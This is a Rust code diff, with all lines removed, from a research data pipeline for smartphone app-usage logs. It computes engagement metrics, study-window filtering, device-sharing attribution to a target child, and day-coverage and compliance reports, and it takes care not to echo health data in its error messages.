-    rows: &mut [Row],
-    custom_app_engagement_duration: f64,
-    mut after_row: impl FnMut(&mut Row),
-) {
-    fn metrics(
-        previous: Option<(i64, &SharedString)>,
-        start: i64,
-        package: &SharedString,
-        custom_duration: f64,
-    ) -> (i32, i32, i32, f64) {
-        let Some((previous_stop, previous_package)) = previous else {
-            return (1, 1, 0, 0.0);
-        };
-        // Match JS BigInt.asIntN(64, ...) with explicit wrapping subtraction.
-        let gap_seconds = start.wrapping_sub(previous_stop) as f64 / 1_000_000_000.0;
-        (
-            i32::from(gap_seconds > 30.0),
-            i32::from(gap_seconds > custom_duration),
-            i32::from(package != previous_package),
-            gap_seconds / 3600.0,
-        )
-    }
-
-    let mut previous_any: Option<(i64, SharedString)> = None;
-    let mut previous_valid: Option<(i64, SharedString)> = None;
-    for row in rows {
-        let is_primary = row.usage_layer.as_deref() != Some("secondary");
-        let is_valid = is_primary && row.interaction_type == APP_USAGE;
-        let is_any = is_valid || (is_primary && row.interaction_type == FILTERED_APP_USAGE);
-        if !is_any {
-            after_row(row);
-            continue;
-        }
-        let start = row.start_timestamp_ns.unwrap_or(i64::MIN);
-        let stop = row.stop_timestamp_ns.unwrap_or(i64::MIN);
-        let package = row.app_package_name.clone();
-        let (engage_30, engage_custom, switched, gap_hours) = metrics(
-            previous_any
-                .as_ref()
-                .map(|(previous_stop, previous_package)| (*previous_stop, previous_package)),
-            start,
-            &package,
-            custom_app_engagement_duration,
-        );
-        let valid_metrics = is_valid.then(|| {
-            metrics(
-                previous_valid
-                    .as_ref()
-                    .map(|(previous_stop, previous_package)| (*previous_stop, previous_package)),
-                start,
-                &package,
-                custom_app_engagement_duration,
-            )
-        });
-        let any_classification_changed = row.any_app_new_engage_30s != engage_30
-            || row.any_app_new_engage_custom != engage_custom
-            || row.any_app_switched_app != switched;
-        let any_temporal_changed =
-            row.any_app_usage_time_gap_hours.to_bits() != gap_hours.to_bits();
-        let valid_classification_changed =
-            valid_metrics.is_some_and(|(engage_30, engage_custom, switched, _)| {
-                row.valid_app_new_engage_30s != engage_30
-                    || row.valid_app_new_engage_custom != engage_custom
-                    || row.valid_app_switched_app != switched
-            });
-        let valid_temporal_changed = valid_metrics.is_some_and(|(_, _, _, gap_hours)| {
-            row.valid_app_usage_time_gap_hours.to_bits() != gap_hours.to_bits()
-        });
-        if any_classification_changed
-            || any_temporal_changed
-            || valid_classification_changed
-            || valid_temporal_changed
-        {
-            let data = row.edit_components(
-                false,
-                any_temporal_changed || valid_temporal_changed,
-                any_classification_changed || valid_classification_changed,
-            );
-            data.any_app_new_engage_30s = engage_30;
-            data.any_app_new_engage_custom = engage_custom;
-            data.any_app_switched_app = switched;
-            data.any_app_usage_time_gap_hours = gap_hours;
-            if let Some((engage_30, engage_custom, switched, gap_hours)) = valid_metrics {
-                data.valid_app_new_engage_30s = engage_30;
-                data.valid_app_new_engage_custom = engage_custom;
-                data.valid_app_switched_app = switched;
-                data.valid_app_usage_time_gap_hours = gap_hours;
-            }
-        }
-        previous_any = Some((stop, package.clone()));
-        if is_valid {
-            previous_valid = Some((stop, package));
-        }
-        after_row(row);
-    }
-}
-
-fn add_app_usage_detail_columns(rows: &mut [Row], custom_app_engagement_duration: f64) {
-    walk_app_usage_detail_columns(rows, custom_app_engagement_duration, |_| {});
-}
-
-struct PreparedUsageFlags {
-    gap: Vec<(f64, String)>,
-    duration: Vec<(f64, String)>,
-}
-
-fn prepare_usage_flags(
-    long_data_time_gap_thresholds: &[f64],
-    long_usage_duration_thresholds: &[f64],
-) -> PreparedUsageFlags {
-    let mut gap_thresholds = long_data_time_gap_thresholds.to_vec();
-    gap_thresholds.sort_by(|a, b| b.partial_cmp(a).unwrap_or(std::cmp::Ordering::Equal));
-    let mut dur_thresholds = long_usage_duration_thresholds.to_vec();
-    dur_thresholds.sort_by(|a, b| b.partial_cmp(a).unwrap_or(std::cmp::Ordering::Equal));
-    let gap_thresholds = gap_thresholds
-        .into_iter()
-        .map(|threshold| {
-            (
-                threshold,
-                format!(">{}-HR TIME GAP", format_threshold(threshold)),
-            )
-        })
-        .collect::<Vec<_>>();
-    let dur_thresholds = dur_thresholds
-        .into_iter()
-        .map(|threshold| {
-            (
-                threshold,
-                format!(">{}-HR APP USAGE", format_threshold(threshold)),
-            )
-        })
-        .collect::<Vec<_>>();
-    PreparedUsageFlags {
-        gap: gap_thresholds,
-        duration: dur_thresholds,
-    }
-}
-
-fn mark_app_usage_flags_row(row: &mut Row, thresholds: &PreparedUsageFlags) {
-    let gap_flag = thresholds
-        .gap
-        .iter()
-        .find(|(threshold, _)| row.data_time_gap_hours >= *threshold)
-        .map(|(_, label)| label.as_str());
-    let dur_hours = row.duration_minutes.map(|m| m / 60.0).unwrap_or(0.0);
-    let duration_flag = thresholds
-        .duration
-        .iter()
-        .find(|(threshold, _)| dur_hours >= *threshold)
-        .map(|(_, label)| label.as_str());
-    if gap_flag.is_none() && duration_flag.is_none() {
-        if row.any_app_usage_flags != "[]" {
-            row.edit_classification().any_app_usage_flags = "[]".into();
-        }
-    } else {
-        let value = match (gap_flag, duration_flag) {
-            (Some(gap), Some(duration)) => format!("['{gap}', '{duration}']"),
-            (Some(gap), None) => format!("['{gap}']"),
-            (None, Some(duration)) => format!("['{duration}']"),
-            (None, None) => unreachable!("handled empty flags above"),
-        };
-        if row.any_app_usage_flags.as_str() != value {
-            row.edit_classification().any_app_usage_flags = value.into();
-        }
-    }
-}
-
-fn mark_app_usage_flags(
-    rows: &mut [Row],
-    long_data_time_gap_thresholds: &[f64],
-    long_usage_duration_thresholds: &[f64],
-) {
-    let thresholds = prepare_usage_flags(
-        long_data_time_gap_thresholds,
-        long_usage_duration_thresholds,
-    );
-    for row in rows {
-        mark_app_usage_flags_row(row, &thresholds);
-    }
-}
-
-/// JS Number(threshold).toString() — integers print without decimals.
-fn format_threshold(t: f64) -> String {
-    js_number_to_string(t)
-}
-
-fn clear_filtered_usage_timing_row(row: &mut Row) {
-    if row.interaction_type == FILTERED_APP_USAGE
-        && (row.start_timestamp_ns.is_some()
-            || row.stop_timestamp_ns.is_some()
-            || row.duration_seconds.is_some()
-            || row.duration_minutes.is_some())
-    {
-        let data = row.edit_temporal();
-        data.start_timestamp_ns = None;
-        data.stop_timestamp_ns = None;
-        data.duration_seconds = None;
-        data.duration_minutes = None;
-    }
-}
-
-fn clear_filtered_usage_timing(rows: &mut [Row]) {
-    for row in rows {
-        clear_filtered_usage_timing_row(row);
-    }
-}
-
-fn apply_review_annotations_one_pass(
-    rows: &mut [Row],
-    custom_app_engagement_duration: f64,
-    long_data_time_gap_thresholds: &[f64],
-    long_usage_duration_thresholds: &[f64],
-) {
-    let thresholds = prepare_usage_flags(
-        long_data_time_gap_thresholds,
-        long_usage_duration_thresholds,
-    );
-    walk_app_usage_detail_columns(rows, custom_app_engagement_duration, |row| {
-        mark_app_usage_flags_row(row, &thresholds);
-        clear_filtered_usage_timing_row(row);
-    });
-}
-
-#[allow(private_interfaces)]
-pub(super) fn apply_static_review_annotations_fused(
-    rows: &mut [Row],
-    filtered_packages: &BTreeSet<String>,
-    codebook_enabled: bool,
-    codebook_map: &HashMap<String, CodebookEntry>,
-    custom_app_engagement_duration: f64,
-    long_data_time_gap_thresholds: &[f64],
-    long_usage_duration_thresholds: &[f64],
-) {
-    // Single fused pass: junk relabel + codebook are applied per-row BEFORE
-    // the engagement walk reads interaction_type (which apply_app_inclusion_policy
-    // changes from APP_USAGE to FILTERED_APP_USAGE). The engagement walk
-    // carries sequential state (previous_any/previous_valid) across rows.
-    // After each row's engagement columns are computed, flags + clear run.
-    let has_junk = !filtered_packages.is_empty();
-    let broad_indices = codebook_enabled.then(|| {
-        [
-            codebook_col_index("bcm_play_store_broad_app_category").unwrap(),
-            codebook_col_index("usc_broad_app_category").unwrap(),
-            codebook_col_index("babyemu_broad_app_category").unwrap(),
-            codebook_col_index("bcm_cnrc_heuristic_category").unwrap(),
-        ]
-    });
-    let genre_indices = codebook_enabled.then(|| {
-        [
-            codebook_col_index("babyemu_genreId_scraped").unwrap(),
-            codebook_col_index("babyemu_genreId_manual").unwrap(),
-            codebook_col_index("bcm_play_store_genreId").unwrap(),
-            codebook_col_index("usc_genreId").unwrap(),
-        ]
-    });
-    let thresholds = prepare_usage_flags(
-        long_data_time_gap_thresholds,
-        long_usage_duration_thresholds,
-    );
-    walk_app_usage_detail_columns_with_pre(
-        rows,
-        custom_app_engagement_duration,
-        |row| {
-            if has_junk && filtered_packages.contains(row.app_package_name.as_str()) {
-                if row.interaction_type == APP_USAGE {
-                    row.edit_classification().interaction_type = FILTERED_APP_USAGE.into();
-                    let temporal = row.edit_temporal();
-                    temporal.duration_seconds = None;
-                    temporal.duration_minutes = None;
-                } else if row.interaction_type == ACTIVITY_STOPPED {
-                    row.edit_classification().interaction_type = FILTERED_STOPPED.into();
-                    let temporal = row.edit_temporal();
-                    temporal.start_timestamp_ns = None;
-                    temporal.stop_timestamp_ns = None;
-                    temporal.duration_seconds = None;
-                    temporal.duration_minutes = None;
-                } else {
-                    let temporal = row.edit_temporal();
-                    temporal.start_timestamp_ns = None;
-                    temporal.stop_timestamp_ns = None;
-                    temporal.duration_seconds = None;
-                    temporal.duration_minutes = None;
-                }
-            }
-            if let (Some(broad), Some(genre)) = (broad_indices, genre_indices) {
-                join_codebook_row(row, codebook_map);
-                derive_broad_category_row(row, broad);
-                collapse_app_genre_row(row, genre);
-            }
-        },
-        |row| {
-            mark_app_usage_flags_row(row, &thresholds);
-            clear_filtered_usage_timing_row(row);
-        },
-    );
-}
-
-fn add_no_activity_placeholder_rows(mut app_rows: Vec<Row>, raw_rows: &[Row]) -> Vec<Row> {
-    let mut usage_days: AHashSet<(SharedString, SharedString)> = AHashSet::new();
-    for row in &app_rows {
-        if row.interaction_type == APP_USAGE {
-            usage_days.insert((row.participant_id.clone(), row.date.clone()));
-        }
-    }
-
-    // Preserve JavaScript Map insertion order: raw rows are event-sorted, so
-    // samples are emitted in first-observed participant/day order.
-    let mut sample_index: HashMap<(SharedString, SharedString), usize> = HashMap::new();
-    let mut samples: Vec<Row> = Vec::new();
-    for row in raw_rows {
-        let key = (row.participant_id.clone(), row.date.clone());
-        if let Some(index) = sample_index.get(&key).copied() {
-            if row.event_timestamp_ns < samples[index].event_timestamp_ns {
-                samples[index] = row.clone();
-            }
-        } else {
-            sample_index.insert(key, samples.len());
-            samples.push(row.clone());
-        }
-    }
-
-    let mut date_memo = LocalDateMemo::default();
-    for mut sample in samples {
-        let key = (sample.participant_id.clone(), sample.date.clone());
-        if usage_days.contains(&key) {
-            continue;
-        }
-        sample.interaction_type = APP_USAGE.into();
-        sample.app_package_name = "com.placeholder.noactivity".into();
-        sample.application_label = "No Activity".into();
-        sample.start_timestamp_ns = Some(sample.event_timestamp_ns);
-        sample.stop_timestamp_ns = Some(sample.event_timestamp_ns);
-        sample.duration_seconds = Some(0.0);
-        sample.duration_minutes = Some(0.0);
-        sample.data_time_gap_hours = 0.0;
-        sample.index += 2_000_000;
-        let timezone: Tz = sample.timezone.parse().unwrap_or(chrono_tz::UTC);
-        populate_time_columns(&mut sample, timezone, &mut date_memo);
-        app_rows.push(sample);
-    }
-    app_rows.sort_by(|left, right| {
-        left.event_timestamp_ns
-            .cmp(&right.event_timestamp_ns)
-            .then(left.index.cmp(&right.index))
-    });
-    app_rows
-}
-
-#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-struct StudyWindow {
-    participant_id: String,
-    start_date: String,
-    end_date: String,
-}
-
-fn normalize_support_date(value: &str) -> Result<String, String> {
-    let value = value.trim();
-    if value.len() >= 10 {
-        let prefix = &value[..10];
-        if prefix.as_bytes().get(4) == Some(&b'-') && prefix.as_bytes().get(7) == Some(&b'-') {
-            return Ok(prefix.to_string());
-        }
-    }
-    // PHI safety: never echo the raw cell — callers annotate the column and
-    // participant instead.
-    let parts: Vec<_> = value.split('/').collect();
-    if parts.len() == 3 {
-        let month = parts[0]
-            .parse::<u8>()
-            .map_err(|_| "unparseable date value".to_string())?;
-        let day = parts[1]
-            .parse::<u8>()
-            .map_err(|_| "unparseable date value".to_string())?;
-        let year = parts[2]
-            .parse::<u16>()
-            .map_err(|_| "unparseable date value".to_string())?;
-        return Ok(format!("{year:04}-{month:02}-{day:02}"));
-    }
-    Err("unparseable date value".to_string())
-}
-
-fn parse_study_windows(bytes: &[u8]) -> Result<Vec<StudyWindow>, String> {
-    let rows = parse_csv_to_records(bytes);
-    let mut windows = Vec::new();
-    for row in rows {
-        let participant_id = trim_owned(row.get("participant_id"));
-        if participant_id.is_empty() {
-            continue;
-        }
-        let start_date = normalize_support_date(
-            row.get("start_date")
-                .ok_or("Study dates file: missing required column start_date")?,
-        )
-        .map_err(|_| format!("Study dates file: unparseable start_date for {participant_id}"))?;
-        let end_date = normalize_support_date(
-            row.get("end_date")
-                .ok_or("Study dates file: missing required column end_date")?,
-        )
-        .map_err(|_| format!("Study dates file: unparseable end_date for {participant_id}"))?;
-        if end_date < start_date {
-            return Err(format!(
-                "Study dates file: window for {participant_id} ends before it starts"
-            ));
-        }
-        windows.push(StudyWindow {
-            participant_id,
-            start_date,
-            end_date,
-        });
-    }
-    Ok(windows)
-}
-
-fn numerical_id(value: &str) -> Option<&str> {
-    let bytes = value.as_bytes();
-    let mut start = None;
-    for (index, byte) in bytes.iter().enumerate() {
-        if byte.is_ascii_digit() {
-            start.get_or_insert(index);
-        } else if let Some(begin) = start.take() {
-            if index - begin >= 3 {
-                return Some(&value[begin..index]);
-            }
-        }
-    }
-    start.and_then(|begin| (bytes.len() - begin >= 3).then_some(&value[begin..]))
-}
-
-#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-struct ResolvedParticipantWindow {
-    participant_id: String,
-    window: Option<StudyWindow>,
-}
-
-fn resolve_participant_windows(
-    rows: &[Row],
-    windows: &[StudyWindow],
-) -> Vec<ResolvedParticipantWindow> {
-    let mut seen = AHashSet::new();
-    let mut resolved = Vec::new();
-    for row in rows {
-        if !seen.insert(row.participant_id.clone()) {
-            continue;
-        }
-        let exact = windows
-            .iter()
-            .find(|window| window.participant_id == row.participant_id.as_str());
-        let window = exact.or_else(|| {
-            let id = numerical_id(&row.participant_id)?;
-            windows
-                .iter()
-                .find(|window| numerical_id(&window.participant_id) == Some(id))
-        });
-        resolved.push(ResolvedParticipantWindow {
-            participant_id: row.participant_id.to_string(),
-            window: window.cloned(),
-        });
-    }
-    resolved
-}
-
-fn apply_study_window(
-    rows: Vec<Row>,
-    resolved: &[ResolvedParticipantWindow],
-) -> (Vec<Row>, usize, Vec<String>) {
-    let resolved = resolved
-        .iter()
-        .map(|entry| (entry.participant_id.as_str(), entry.window.as_ref()))
-        .collect::<BTreeMap<_, _>>();
-    let participants_without_window = resolved
-        .iter()
-        .filter_map(|(participant_id, window)| {
-            window.is_none().then_some((*participant_id).to_string())
-        })
-        .collect::<Vec<_>>();
-    let before = rows.len();
-    let rows = rows
-        .into_iter()
-        .filter(|row| {
-            resolved
-                .get(row.participant_id.as_str())
-                .copied()
-                .flatten()
-                .is_none_or(|window| {
-                    row.date.as_str() >= window.start_date.as_str()
-                        && row.date.as_str() <= window.end_date.as_str()
-                })
-        })
-        .collect::<Vec<_>>();
-    let dropped = before.saturating_sub(rows.len());
-    (rows, dropped, participants_without_window)
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "snake_case")]
-enum SharingStatus {
-    Shared,
-    NonShared,
-}
-
-#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-struct SharingEntry {
-    participant_id: String,
-    status: SharingStatus,
-}
-
-fn support_value<'a>(row: &'a HashMap<String, String>, wanted: &str) -> Option<&'a str> {
-    row.iter()
-        .find(|(header, _)| header.trim().eq_ignore_ascii_case(wanted))
-        .map(|(_, value)| value.as_str())
-}
-
-fn require_support_columns(
-    file_label: &str,
-    rows: &[HashMap<String, String>],
-    required: &[&str],
-) -> Result<(), String> {
-    let Some(first) = rows.first() else {
-        return Err(format!(
-            "{file_label}: missing required columns or data rows"
-        ));
-    };
-    let missing: Vec<_> = required
-        .iter()
-        .filter(|column| support_value(first, column).is_none())
-        .copied()
-        .collect();
-    if missing.is_empty() {
-        Ok(())
-    } else {
-        // PHI safety: never echo the found headers — a headerless upload
-        // would leak its first data row here.
-        Err(format!(
-            "{file_label}: missing required column(s) {}",
-            missing.join(", ")
-        ))
-    }
-}
-
-fn parse_device_sharing(bytes: &[u8]) -> Result<Vec<SharingEntry>, String> {
-    let rows = parse_csv_to_records(bytes);
-    require_support_columns(
-        "Device sharing file",
-        &rows,
-        &["participant_id", "sharing_status"],
-    )?;
-    rows.into_iter()
-        .filter_map(|row| {
-            let participant_id = support_value(&row, "participant_id")?.trim().to_string();
-            (!participant_id.is_empty()).then_some((row, participant_id))
-        })
-        .map(|(row, participant_id)| {
-            let raw = support_value(&row, "sharing_status")
-                .unwrap_or_default()
-                .trim();
-            let status = if raw.eq_ignore_ascii_case("shared") {
-                SharingStatus::Shared
-            } else if raw.eq_ignore_ascii_case("non-shared")
-                || raw.eq_ignore_ascii_case("nonshared")
-                || raw.eq_ignore_ascii_case("not shared")
-            {
-                SharingStatus::NonShared
-            } else {
-                return Err(format!(
-                    "Device sharing file: unknown sharing_status for {participant_id} (expected \"Shared\" or \"Non-Shared\")"
-                ));
-            };
-            Ok(SharingEntry {
-                participant_id,
-                status,
-            })
-        })
-        .collect()
-}
-
-fn device_number(participant_id: &str) -> u32 {
-    participant_id
-        .find("-D")
-        .and_then(|index| {
-            let digits: String = participant_id[index + 2..]
-                .chars()
-                .take_while(char::is_ascii_digit)
-                .collect();
-            (!digits.is_empty()).then_some(digits)
-        })
-        .and_then(|digits| digits.parse().ok())
-        .unwrap_or(1)
-}
-
-fn sharing_status_for(
-    participant_id: &str,
-    sharing: &[SharingEntry],
-) -> Result<SharingStatus, String> {
-    if let Some(entry) = sharing
-        .iter()
-        .find(|entry| entry.participant_id == participant_id)
-    {
-        return Ok(entry.status);
-    }
-    let numerical = numerical_id(participant_id);
-    if let Some(wanted_id) = numerical {
-        let wanted_device = device_number(participant_id);
-        if let Some(entry) = sharing.iter().find(|entry| {
-            numerical_id(&entry.participant_id) == Some(wanted_id)
-                && device_number(&entry.participant_id) == wanted_device
-        }) {
-            return Ok(entry.status);
-        }
-    }
-    Err(format!(
-        "Person attribution: no device-sharing status for {participant_id:?} (numerical={}). The sharing table must cover every device when it is configured.",
-        numerical.unwrap_or("none")
-    ))
-}
-
-fn parse_survey_timestamp_ns(value: &str) -> Result<i64, String> {
-    // PHI safety: never echo the raw cell — the caller annotates the
-    // participant instead.
-    let text = value.trim();
-    if text.len() >= 10 && text.bytes().all(|byte| byte.is_ascii_digit()) {
-        let parsed = text.parse::<i64>().map_err(|_| {
-            "Survey attribution file: unparseable event_timestamp value".to_string()
-        })?;
-        return if text.len() >= 19 {
-            Ok(parsed)
-        } else if text.len() >= 13 {
-            parsed
-                .checked_mul(1_000_000)
-                .ok_or_else(|| "Survey attribution file: event_timestamp overflow".to_string())
-        } else {
-            parsed
-                .checked_mul(1_000_000_000)
-                .ok_or_else(|| "Survey attribution file: event_timestamp overflow".to_string())
-        };
-    }
-    parse_chronicle_timestamp_ns(text)
-        .ok_or_else(|| "Survey attribution file: unparseable event_timestamp value".to_string())
-}
-
-fn parse_survey_lookup(bytes: &[u8]) -> Result<BTreeMap<(String, i64), String>, String> {
-    if bytes.is_empty() {
-        return Ok(BTreeMap::new());
-    }
-    let rows = parse_csv_to_records(bytes);
-    require_support_columns(
-        "Survey attribution file",
-        &rows,
-        &["participant_id", "event_timestamp", "users"],
-    )?;
-    let mut lookup = BTreeMap::new();
-    for row in rows {
-        let participant_id = support_value(&row, "participant_id")
-            .unwrap_or_default()
-            .trim();
-        let timestamp = support_value(&row, "event_timestamp")
-            .unwrap_or_default()
-            .trim();
-        let user = support_value(&row, "users")
-            .unwrap_or_default()
-            .trim()
-            .trim_matches(|character| matches!(character, '{' | '}' | '"'));
-        if participant_id.is_empty() || timestamp.is_empty() || user.is_empty() {
-            continue;
-        }
-        lookup.insert(
-            (
-                participant_id.to_string(),
-                parse_survey_timestamp_ns(timestamp)
-                    .map_err(|error| format!("{error} (participant {participant_id})"))?,
-            ),
-            user.to_string(),
-        );
-    }
-    Ok(lookup)
-}
-
-fn is_null_username(username: &str) -> bool {
-    username.is_empty() || username == "nan"
-}
-
-fn is_target_child(username: &str) -> bool {
-    username.to_ascii_lowercase().contains("target child")
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct SharingResolution {
-    status_by_participant: BTreeMap<String, SharingStatus>,
-    shared_participants: Vec<String>,
-    non_shared_participants: Vec<String>,
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct AttributionReport {
-    shared_participants: Vec<String>,
-    non_shared_participants: Vec<String>,
-    survey_relabels: usize,
-    non_target_rows: usize,
-    kids_shell_attributions: usize,
-    null_usernames_filled: usize,
-}
-
-fn attribute_person(
-    mut rows: Vec<Row>,
-    resolution: &SharingResolution,
-    survey: &BTreeMap<(String, i64), String>,
-) -> Result<(Vec<Row>, AttributionReport), String> {
-    let mut report = AttributionReport {
-        shared_participants: resolution.shared_participants.clone(),
-        non_shared_participants: resolution.non_shared_participants.clone(),
-        survey_relabels: 0,
-        non_target_rows: 0,
-        kids_shell_attributions: 0,
-        null_usernames_filled: 0,
-    };
-    for row in &mut rows {
-        let status = *resolution
-            .status_by_participant
-            .get(row.participant_id.as_str())
-            .ok_or_else(|| {
-                format!(
-                    "Person attribution: unresolved sharing status for {:?}",
-                    row.participant_id
-                )
-            })?;
-        match status {
-            SharingStatus::NonShared => {
-                if is_null_username(&row.username) {
-                    row.username = "Target Child".into();
-                    report.null_usernames_filled += 1;
-                }
-            }
-            SharingStatus::Shared => {
-                if is_null_username(&row.username) {
-                    row.username = if KIDS_SHELL_PACKAGES.contains(&row.app_package_name.as_str()) {
-                        report.kids_shell_attributions += 1;
-                        "Target Child".into()
-                    } else {
-                        "None".into()
-                    };
-                    report.null_usernames_filled += 1;
-                }
-                if let Some(user) =
-                    survey.get(&(row.participant_id.to_string(), row.event_timestamp_ns))
-                {
-                    row.username = format!("{user} (From Survey)").into();
-                    report.survey_relabels += 1;
-                }
-                if row.interaction_type == APP_USAGE && !is_target_child(&row.username) {
-                    row.interaction_type = NON_TARGET_CHILD_APP_USAGE.into();
-                    report.non_target_rows += 1;
-                }
-            }
-        }
-    }
-    Ok((rows, report))
-}
-
-fn window_for<'a>(participant_id: &str, windows: &'a [StudyWindow]) -> Option<&'a StudyWindow> {
-    windows
-        .iter()
-        .find(|window| window.participant_id == participant_id)
-        .or_else(|| {
-            let id = numerical_id(participant_id)?;
-            windows
-                .iter()
-                .find(|window| numerical_id(&window.participant_id) == Some(id))
-        })
-}
-
-fn inclusive_dates(start: &str, end: &str) -> Result<Vec<String>, String> {
-    let mut current = NaiveDate::parse_from_str(start, "%Y-%m-%d")
-        .map_err(|error| format!("invalid coverage start date: {error}"))?;
-    let end = NaiveDate::parse_from_str(end, "%Y-%m-%d")
-        .map_err(|error| format!("invalid coverage end date: {error}"))?;
-    let mut dates = Vec::new();
-    while current <= end {
-        dates.push(current.format("%Y-%m-%d").to_string());
-        current = current
-            .checked_add_signed(Duration::days(1))
-            .ok_or("coverage date range overflow")?;
-    }
-    Ok(dates)
-}
-
-fn csv_escape_value(value: &str) -> String {
-    if value.contains([',', '"', '\n']) {
-        format!("\"{}\"", value.replace('"', "\"\""))
-    } else {
-        value.to_string()
-    }
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct CoverageDayCheckpoint {
-    participant_id: String,
-    date: String,
-    status: String,
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct DayCoverageCheckpoint {
-    coverage: Vec<CoverageDayCheckpoint>,
-    usage_days: usize,
-    no_activity_days: usize,
-    no_data_days: usize,
-}
-
-fn index_raw_dates(raw_rows: &[Row]) -> BTreeMap<String, BTreeSet<String>> {
-    let mut raw_dates: BTreeMap<String, BTreeSet<String>> = BTreeMap::new();
-    for row in raw_rows {
-        raw_dates
-            .entry(if row.participant_id.is_empty() {
-                "unknown".into()
-            } else {
-                row.participant_id.to_string()
-            })
-            .or_default()
-            .insert(row.date.to_string());
-    }
-    raw_dates
-}
-
-fn build_day_coverage_csv(
-    usage_rows: &[Row],
-    raw_dates: &BTreeMap<String, BTreeSet<String>>,
-    windows: &[StudyWindow],
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<(Vec<u8>, u32), String> {
-    let output = incremental::build_coverage(usage_rows, raw_dates, windows)?;
-    query_checkpoints.value("build_participant_day_coverage", &output.report)?;
-    Ok((output.csv_bytes, output.report.coverage.len() as u32))
-}
-
-fn js_rounded_number(value: f64) -> String {
-    let mut text = normalize_float_string(value);
-    if let Some(integer) = text.strip_suffix(".0") {
-        text = integer.to_string();
-    }
-    text
-}
-
-fn parse_enrolled_devices(bytes: &[u8]) -> Result<BTreeMap<String, u32>, String> {
-    if bytes.is_empty() {
-        return Ok(BTreeMap::new());
-    }
-    let rows = parse_csv_to_records(bytes);
-    require_support_columns(
-        "Enrolled devices file",
-        &rows,
-        &["participant_id", "device_count"],
-    )?;
-    let mut devices = BTreeMap::new();
-    for row in rows {
-        let participant_id = support_value(&row, "participant_id")
-            .unwrap_or_default()
-            .trim();
-        if participant_id.is_empty() {
-            continue;
-        }
-        let raw = support_value(&row, "device_count")
-            .unwrap_or_default()
-            .trim();
-        let count = if raw.is_empty() {
-            0
-        } else {
-            raw.parse::<u32>().map_err(|_| {
-                format!("Enrolled devices file: invalid device_count for {participant_id}")
-            })?
-        };
-        devices.insert(participant_id.to_string(), count);
-    }
-    Ok(devices)
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct ComplianceDayCheckpoint {
-    participant_id: String,
-    date: String,
-    sharing_status: String,
-    known_minutes: f64,
-    unknown_minutes: f64,
-    compliance_percent: f64,
-    zero_real_usage: bool,
-    is_valid: bool,
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-struct ComplianceResultCheckpoint {
-    days: Vec<ComplianceDayCheckpoint>,
-    valid_days: usize,
-    invalid_days: usize,
-    zero_usage_days: usize,
-}
-
-fn build_compliance_csv(
-    rows: &[Row],
-    shared_participants: &BTreeSet<String>,
-    threshold_percent: f64,
-    enrolled_devices: &BTreeMap<String, u32>,
-    query_checkpoints: &mut QueryCheckpointRecorder<'_>,
-) -> Result<(Vec<u8>, u32), String> {
-    let attribution = incremental::accumulate_minutes(rows);
-    let bucket_checkpoint = attribution
-        .buckets
-        .iter()
-        .map(
-            |((participant_id, date), (known_minutes, unknown_minutes))| {
-                serde_json::json!({
-                    "participantId": participant_id,
-                    "date": date,
-                    "knownMinutes": known_minutes,
-                    "unknownMinutes": unknown_minutes,
-                })
-            },
-        )
-        .collect::<Vec<_>>();
-    query_checkpoints.value(
-        "aggregate_attribution_minutes",
-        &serde_json::json!({
-            "participantsSeen": &attribution.participants_seen,
-            "buckets": bucket_checkpoint,
-        }),
-    )?;
-    let completeness =
-        incremental::compute_attribution_completeness(&attribution, shared_participants);
-    query_checkpoints.value("compute_attribution_completeness", &completeness)?;
-    let result = incremental::apply_compliance_threshold(&completeness, threshold_percent);
-    query_checkpoints.value("classify_compliance_days", &result)?;
-    let bytes = incremental::compliance_csv(&result, enrolled_devices);
-    let row_count = result.days.len() as u32;
-    Ok((bytes, row_count))
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-enum ScreenCreditState {
-    On,
-    Off,
-}
-
-#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
-struct ScreenChangePoint {
-    timestamp_ns: i64,
-    state: ScreenCreditState,
-    source_data_rows: SourceDataRows,
-}
-
-#[derive(Clone, Default, serde::Serialize, serde::Deserialize)]
-struct ScreenCreditSubstrate {
-    points: BTreeMap<String, Vec<ScreenChangePoint>>,
-    boots: BTreeMap<String, Vec<i64>>,
-    all_timestamps: BTreeMap<String, Vec<i64>>,
-    source_events: BTreeMap<String, Vec<(i64, SourceDataRows)>>,
-    source_event_suffix_digests: BTreeMap<String, Vec<String>>,
-    capable: BTreeSet<String>,
-}
-
-type CreditInterval = (i64, i64);
-
-fn screen_witness_state(interaction_type: &str) -> Result<Option<ScreenCreditState>, String> {
-    let interaction_type = if interaction_type == "Screen Non-interactive" {
-        "Screen Non-Interactive"
-    } else {
-        interaction_type
-    };
-    if interaction_type.starts_with("Unknown importance:")
-        || interaction_type
-            .strip_prefix("n: ")
-            .and_then(|rest| rest.as_bytes().first())
-            .is_some_and(u8::is_ascii_digit)
-    {
-        // PHI safety: raw cell values must never enter error strings surfaced
-        // to the UI/console — the caller appends the data-row position.
-        return Err(
-            "Screen-gated credit: unmapped interaction type in the raw stream — extend the interaction-type mapping before crediting."
-                .to_string(),
-        );
-    }
-    let state = match interaction_type {
-        "Screen Interactive"
-        | "User Interaction"
-        | "Shortcut Invocation"
-        | "Keyguard Hidden"
-        | "User Unlocked"
-        | "Chooser Action" => Some(ScreenCreditState::On),
-        "Screen Non-Interactive" | "Device Shutdown" => Some(ScreenCreditState::Off),
-        _ => None,
-    };
-    Ok(state)
-}
-
-fn screen_source_event_suffix_digest(
